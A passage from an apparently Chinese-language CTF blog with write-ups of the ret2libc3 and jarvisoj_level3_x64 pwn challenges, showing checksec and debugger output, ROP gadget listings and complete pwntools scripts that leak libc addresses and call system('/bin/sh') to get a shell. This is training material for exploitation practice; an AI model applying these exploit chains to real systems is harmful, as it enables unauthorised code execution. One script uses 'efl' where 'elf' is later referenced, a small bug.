linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=c0ad441ebd58b907740c1919460c37bb99bb65df, with debug_info, not stripped</span><br></pre></td></tr></table></figure><p>这是一个次啊用动态链接库编译的32位EILF文件</p><h3 id="软件防护-4"><a href="#软件防护-4" class="headerlink" title="软件防护"></a>软件防护</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ┌──(kali㉿kali)-[~/pwn/ret2libc3-libc?]</span><br><span class="line">└─$ checksec ret2libc3 </span><br><span class="line">[*] <span class="string">&#x27;/home/kali/pwn/ret2libc3-libc?/ret2libc3&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure><p>NX是开启的，PIE关闭，这基本就是代表了不能自己写入命令去执行。但是可以拿到对应bss、text、data相关的一些固定信息。</p><h3 id="IDA分析-6"><a href="#IDA分析-6" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>简单看了一下，ida中main函数内容如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250405160713.png"><br>然后还有一个<code>secure</code>函数，里面没有有帮助的内容，如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250405160748.png"><br>然后ida中还有一个bss buf2可以用，但是那个似乎只能在低版本内核中使用，这里就不考虑了。其他有用信息基本没有。。</p><h3 id="攻击思路-6"><a href="#攻击思路-6" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>根据ida的内容，主要围绕main函数进行，这里只有一个栈溢出漏洞存在，并且没有system函数和sh字符串可以用，并且这道题目并没有给我们libc库，我们需要通过自己构造执行流，在题目系统中，大概率是开启ASLR的，地址也随即，我们还需要通过自己构造的执行流是心啊反弹地址的一个功能，拿到地址通过特征去libc-database中寻找可能的libc版本，再去确定偏移然后通过偏移找到system的位置，到这一步之后我们还可以通过构造执行流去获取一个<code>sh</code>字符串，或者说是从程序、libc中拿到一个<code>sh</code>字符串。</p><h3 id="溢出位数"><a href="#溢出位数" class="headerlink" title="溢出位数"></a>溢出位数</h3><p>使用pwndbg调试，查看位数的位置应该是在gets函数执行过后，内如如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────</span><br><span class="line">*EAX  0xffffd10c ◂— <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"> EBX  0xf7f9ce14 (_GLOBAL_OFFSET_TABLE_) ◂— 0x235d0c /* <span class="string">&#x27;\x0c]#&#x27;</span> */</span><br><span class="line">*ECX  0xf7f9e8ac (_IO_stdfile_0_lock) ◂— 0</span><br><span class="line"> EDX  0</span><br><span class="line"> EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0</span><br><span class="line"> ESI  0x80486a0 (__libc_csu_init) ◂— push ebp</span><br><span class="line"> EBP  0xffffd178 ◂— 0</span><br><span class="line"> ESP  0xffffd0f0 —▸ 0xffffd10c ◂— <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">*EIP  0x804868f (main+119) ◂— mov eax, 0</span><br></pre></td></tr></table></figure><p>0xffffd178-0xffffd10c&#x3D;108+4&#x3D;112</p><h3 id="攻击脚本-4"><a href="#攻击脚本-4" class="headerlink" title="攻击脚本"></a>攻击脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">pop_ebp_addr = <span class="number">0x080486FF</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">b&quot;a&quot;</span> * <span class="number">112</span>,</span><br><span class="line">        elf.plt[<span class="string">&quot;puts&quot;</span>],</span><br><span class="line">        pop_ebp_addr,</span><br><span class="line">        elf.got[<span class="string">&quot;puts&quot;</span>],</span><br><span class="line">        elf.symbols[<span class="string">&quot;main&quot;</span>],</span><br><span class="line">    ]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>这里干了三件事，首先溢出并且通过puts函数把puts函数真实在内存中的地址输出出来，然后栈平衡一下继续重新运行mian函数。拿到这个地址之后可以通过libcsearch这个库去搜索对应的libc库<br>具体代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">io.sendlineafter(<span class="string">b&quot;!?&quot;</span>, payload)</span><br><span class="line">libc_start_main_leak = io.recvline()</span><br><span class="line">leak_bytes = libc_start_main_leak[:<span class="number">4</span>]</span><br><span class="line">addr = u32(leak_bytes)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, addr)</span><br><span class="line">offset = addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br></pre></td></tr></table></figure><p>上面的操作是拿到地址之后去libcsearch中搜索对应可能的libc，在ASLR中，他的偏移范围都是按照页的倍数去虚拟化内存地址的，一个页就是<code>4096</code>，4096的16进制是<code>1000</code>，所以后面的三位就不会变化，libcsearch就是通过这个后三位去模糊匹配。运行的时候他会弹出一个选择框，如下图<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250405183241.png"><br>这些都是有可能的libc库，但是因为libcsearch好久没有更新了，而且libc都是7年前的了，只有老版本的这种题目可以使用，新版本的libc可以去<a href="https://github.com/niklasb/libc-database.git">libc-database</a>项目区查询。最终通过猜到的libc拿到对应的偏移区去尝试工具，因为上面组装的payload继续运行了main，就是说我们还可以继续溢出，再次构建一个payload，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload2 = flat(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">b&quot;a&quot;</span> * <span class="number">112</span>,</span><br><span class="line">        libc.dump(<span class="string">&quot;system&quot;</span>) + offset,</span><br><span class="line">        <span class="number">0xDEADBEEF</span>,</span><br><span class="line">        libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>) + offset,</span><br><span class="line">    ]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>这里继续溢出了112，因为上面咱们通过<code>pop_ebp_addr</code>栈平衡了一下，所以偏移不会变，后续通过模糊搜索的libc中的system函数+偏移去执行它，后面的参数也是通过libc去查找。<br>完整的攻击脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;pod.ctf.wlaq&quot;</span>, <span class="string">&quot;30922&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_ebp_addr = <span class="number">0x080486FF</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">b&quot;a&quot;</span> * <span class="number">112</span>,</span><br><span class="line">        elf.plt[<span class="string">&quot;puts&quot;</span>],</span><br><span class="line">        pop_ebp_addr,</span><br><span class="line">        elf.got[<span class="string">&quot;puts&quot;</span>],</span><br><span class="line">        elf.symbols[<span class="string">&quot;main&quot;</span>],</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;!?&quot;</span>, payload)</span><br><span class="line">puts_leak = io.recvline()</span><br><span class="line">leak_bytes = puts_leak[:<span class="number">4</span>]</span><br><span class="line">addr = u32(leak_bytes)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, addr)</span><br><span class="line">offset = addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = flat(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">b&quot;a&quot;</span> * <span class="number">112</span>,</span><br><span class="line">        libc.dump(<span class="string">&quot;system&quot;</span>) + offset,</span><br><span class="line">        <span class="number">0xDEADBEEF</span>,</span><br><span class="line">        libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>) + offset,</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>这里要注意的是，如果运行题目的libc版本太高，通过libcsearch估计是做不出来的，得自己通过<a href="https://github.com/niklasb/libc-database.git">libc-database</a>项目去找。</p><h3 id="CTF-WIKI-EXP分析"><a href="#CTF-WIKI-EXP分析" class="headerlink" title="CTF-WIKI-EXP分析"></a>CTF-WIKI-EXP分析</h3><p>去分析一下ctf-wiki提供的exp，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main = ret2libc3.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak libc_start_main_got addr and return to main again&quot;</span>)</span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>, puts_plt, main, libc_start_main_got])</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;Can you find it !?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;get the related addr&quot;</span>)</span><br><span class="line">libc_start_main_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;get shell&quot;</span>)</span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">104</span>, system_addr, <span class="number">0xdeadbeef</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>主要的区别在于他后面的溢出是104位，原因是因为它第一次溢出构造反弹真实函数地址的时候，他没有进行栈平衡，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>, puts_plt, main, libc_start_main_got])</span><br></pre></td></tr></table></figure><p>这里他返回地址直接填到了mian，运行完puts直接执行main，当它这个main执行的时候，栈内的数据应该是空的，然后因为函数调用他会把ebp压栈，所以会多一个4的位置，然后继续开辟一个位置为100的s</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> s[<span class="number">100</span>]</span><br></pre></td></tr></table></figure><p>那么esp的位置距离ret就是104，所以第二个payload需要溢出104。</p><h2 id="x86-32位-与x64-64位-的区别"><a href="#x86-32位-与x64-64位-的区别" class="headerlink" title="x86(32位)与x64(64位)的区别"></a>x86(32位)与x64(64位)的区别</h2><p>x86的函数传参都是保存在栈上面的，而x64的前六个参数都是存放在寄存器中的，依次为<code>RDI</code>、<code>RSI</code>、<code>RDX</code>、<code>RCX</code>、<code>R8</code>、<code>R9</code>中，如果参数大于6个，那么就存放在栈中，然后32位的地址都是占用32个字节(16进制就是4位)，64位的是占用64字节(16位就是8位)，在计算偏移的时候需要注意这一点。</p><h2 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h2><h3 id="题目来源-7"><a href="#题目来源-7" class="headerlink" title="题目来源"></a>题目来源</h3><p>buuctf: <a href="https://buuoj.cn/challenges#jarvisoj_level3_x64">https://buuoj.cn/challenges#jarvisoj_level3_x64</a><br>PS：这道题目我看教程(星盟培训)是给libc的，然后其实libc这个东西给不给都能做，具体就是通过libcsearch挨个试，后面的脚本会有俩版本，一个有libc的一个没有的。</p><h3 id="文件类型-7"><a href="#文件类型-7" class="headerlink" title="文件类型"></a>文件类型</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ┌──(kali㉿kali)-[~/pwn/level9]</span><br><span class="line">└─$ file attachment</span><br><span class="line">attachment: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=f01f8fd41061f9dafb9399e723eb52d249a9b34d, not stripped</span><br></pre></td></tr></table></figure><p>动态链接库编译的ELF文件</p><h3 id="软件防护-5"><a href="#软件防护-5" class="headerlink" title="软件防护"></a>软件防护</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ┌──(kali㉿kali)-[~/pwn/level9]</span><br><span class="line">└─$ checksec attachment</span><br><span class="line">[*] <span class="string">&#x27;/home/kali/pwn/level9/attachment&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>除了nx基本都关闭。</p><h3 id="IDA分析-7"><a href="#IDA分析-7" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>main函数内容如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function(argc, argv, envp);</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;Hello, World!\n&quot;</span>, <span class="number">0xEu</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要看<code>vulnerable_function</code>，vulnerable_function内容如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他的基本没啥有用信息，主要有用信息就是一个栈溢出，buf只有128的位置，然后读入了一个<code>0x200</code>的数据。</p><h3 id="攻击思路-7"><a href="#攻击思路-7" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>这题目除了栈溢出漏洞其他有用信息都没有，栈溢出可以控制程序执行流，这种情况应该只能通过got与libc算偏移，拿到system函数地址，通过libc中找<code>sh</code>去设置system函数的参数。找偏移我们需要让他先把当got表的某个函数的地址泄露出来，拿到它运行的真实地址。在他的程序中可以通过write来回显消息，我们也可以通过它去泄露got地址，因为是64位的程序，前6个参数都得放到寄存器中，我们需要通过gadget去看是否可以通过弹栈的方式去设置参数，能用的gadget如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ┌──(kali㉿kali)-[~/pwn/level9]</span><br><span class="line">└─$ ROPgadget --binary attachment --only <span class="string">&quot;pop|ret&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004006ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006ae : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006b0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006b2 : pop r15 ; ret</span><br><span class="line">0x00000000004006ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006af : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400550 : pop rbp ; ret</span><br><span class="line">0x00000000004006b3 : pop rdi ; ret</span><br><span class="line">0x00000000004006b1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x00000000004006ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400499 : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 11</span><br></pre></td></tr></table></figure><p>去构造一个泄露got的<code>write</code>指令，具体能用的gadget如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 平衡</span></span><br><span class="line">pop_rbp_addr = <span class="number">0x400550</span></span><br><span class="line"><span class="comment"># 第一个参数</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x4006B3</span></span><br><span class="line"><span class="comment"># 第二个参数</span></span><br><span class="line">pop_rsi_r15_addr = <span class="number">0x4006B1</span></span><br></pre></td></tr></table></figure><p>write需要三个参数，第一个是写入位置，第二个是写入的内容，第三个是写入的数量，我们这里只能拿到前两个参数的gadget，遇到这种情况只能试试了，有些时候他这个寄存器中可能本身就存在值，我们不需要设置也可以用，在read函数中我们触发栈溢出的时候，应该是有值的<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250409165746.png"><br>这里edx是200h，我估计会使用这个，因为栈溢出之后也没有清除他，好我们继续，第一个和第二个参数设置好之后我们需要直接运行write，直接使用got的地址即可，然后输出了之后我们还需要让他继续运行，具体方法就是直接让其运行main函数，让我们可以继续去栈溢出，第一个payload就构造好了具体如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">efl = ELF(<span class="string">&quot;./level3_x64&quot;</span>)</span><br><span class="line"><span class="comment"># 平衡</span></span><br><span class="line">pop_rbp_addr = <span class="number">0x400550</span></span><br><span class="line"><span class="comment"># 第一个参数</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x4006B3</span></span><br><span class="line"><span class="comment"># 第二个参数</span></span><br><span class="line">pop_rsi_r15_addr = <span class="number">0x4006B1</span></span><br><span class="line"><span class="comment"># main</span></span><br><span class="line">main_addr = <span class="number">0x40061A</span></span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">b&quot;a&quot;</span> * <span class="number">136</span>,</span><br><span class="line">        p64(pop_rdi_addr),</span><br><span class="line">        p64(<span class="number">1</span>),</span><br><span class="line">        p64(pop_rsi_r15_addr),</span><br><span class="line">        p64(elf.got[<span class="string">&quot;write&quot;</span>]),</span><br><span class="line">        p64(<span class="number">0</span>),</span><br><span class="line">        p64(elf.plt[<span class="string">&quot;write&quot;</span>]),</span><br><span class="line">        p64(pop_rbp_addr),</span><br><span class="line">        p64(<span class="number">0</span>),</span><br><span class="line">        p64(elf.symbols[<span class="string">&quot;main&quot;</span>]),</span><br><span class="line">    ]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>溢出位数这里不多说，可以直接在ida或者动调去看。这个payload会让程序输出write函数在执行的实际地址，然后继续运行<code>main</code>函数。我们通过下面函数去读取回显，程序会写入两次内容，我们一次性接收给他截断，并且补0(-6是因为第一次数据我们没有结束他会输出一个<code>Input:\n</code>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure><p>返回的write地址我们通过libcsearch去查询，具体代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>, addr)</span><br><span class="line">offset = addr - libc.dump(<span class="string">&quot;write&quot;</span>)</span><br></pre></td></tr></table></figure><p>查询之后我们组装第二个payload，具体就是偏移也查出来了，直接去执行system即可，binsh可以直接从libc中寻找，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = flat(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">b&quot;a&quot;</span> * <span class="number">136</span>,</span><br><span class="line">        p64(pop_rdi_addr),</span><br><span class="line">        p64(libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>) + offset),</span><br><span class="line">        p64(libc.dump(<span class="string">&quot;system&quot;</span>) + offset),</span><br><span class="line">    ]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="攻击脚本-5"><a href="#攻击脚本-5" class="headerlink" title="攻击脚本"></a>攻击脚本</h3><p>完整的攻击脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./level3_x64&quot;</span>)</span><br><span class="line">efl = ELF(<span class="string">&quot;./level3_x64&quot;</span>)</span><br><span class="line"><span class="comment"># 平衡</span></span><br><span class="line">pop_rbp_addr = <span class="number">0x400550</span></span><br><span class="line"><span class="comment"># 第一个参数</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x4006B3</span></span><br><span class="line"><span class="comment"># 第二个参数</span></span><br><span class="line">pop_rsi_r15_addr = <span class="number">0x4006B1</span></span><br><span class="line"><span class="comment"># main</span></span><br><span class="line">main_addr = <span class="number">0x40061A</span></span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">b&quot;a&quot;</span> * <span class="number">136</span>,</span><br><span class="line">        p64(pop_rdi_addr),</span><br><span class="line">        p64(<span class="number">1</span>),</span><br><span class="line">        p64(pop_rsi_r15_addr),</span><br><span class="line">        p64(elf.got[<span class="string">&quot;write&quot;</span>]),</span><br><span class="line">        p64(<span class="number">0</span>),</span><br><span class="line">        p64(elf.plt[<span class="string">&quot;write&quot;</span>]),</span><br><span class="line">        p64(pop_rbp_addr),</span><br><span class="line">        p64(<span class="number">0</span>),</span><br><span class="line">        p64(elf.symbols[<span class="string">&quot;main&quot;</span>]),</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>, addr)</span><br><span class="line">offset = addr - libc.dump(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">payload = flat(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">b&quot;a&quot;</span> * <span class="number">136</span>,</span><br><span class="line">        p64(pop_rdi_addr),</span><br><span class="line">        p64(libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>) + offset),</span><br><span class="line">        p64(libc.dump(<span class="string">&quot;system&quot;</span>) + offset),</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>然后再附上一个题目给libc的脚本</p><figure 